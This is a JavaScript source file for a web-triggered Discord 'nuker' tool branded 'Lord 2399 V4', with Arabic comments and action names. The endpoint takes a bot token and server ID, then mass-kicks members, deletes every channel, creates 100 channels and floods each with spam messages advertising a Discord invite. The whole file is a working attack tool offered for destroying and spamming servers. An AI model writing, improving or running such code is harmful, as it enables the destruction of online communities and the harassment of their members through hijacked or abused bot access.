const { Client, GatewayIntentBits, ChannelType } = require('discord.js');
const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

app.post('/execute', async (req, res) => {
    const { token, guildId, action, customName, customMsg } = req.body;
    res.status(200).send({ status: '⚡ إطلاق القوة القصوى V4!' });

    const client = new Client({ intents: [3276799] });

    try {
        await client.login(token);
        const guild = await client.guilds.fetch(guildId).catch(() => null);
        if (!guild) return client.destroy();

        const name = customName || "Lord 2399 V4";
        const msg = customMsg || "# LORD 2399 ON TOP V4\nhttps://discord.gg/2399k";

        // طرد الجميع (مضاعف)
        if (action === 'تدمير' || action === 'طرد') {
            const members = await guild.members.fetch();
            members.forEach(m => { if(m.kickable) m.kick('Lord 2399 V4').catch(() => {}); });
        }

        // تدمير شامل (ضعف القوة)
        if (action === 'تدمير') {
            // حذف الرومات بلحظة
            guild.channels.cache.forEach(c => c.delete().catch(() => {}));
            
            // إنشاء 100 روم بدلاً من 50 (سرعة البرق)
            for (let i = 0; i < 100; i++) {
                setTimeout(() => {
                    guild.channels.create({ name: name, type: ChannelType.GuildText })
                    .then(ch => {
                        // سبام مكثف جداً (60 رسالة لكل روم)
                        for(let j=0; j<60; j++) ch.send(msg).catch(() => {});
                    }).catch(() => {});
                }, i * 50); // تأخير 50 ملي ثانية فقط!
            }
        }

        if (action === 'سبام') {
            guild.channels.cache.forEach(ch => {
                if(ch.type === ChannelType.GuildText) {
                    for(let i=0; i<100; i++) setTimeout(() => ch.send(msg).catch(() => {}), i * 150);
                }
            });
        }
    } catch (e) { console.error("Error V4"); }
});

app.listen(process.env.PORT || 3000, '0.0.0.0');
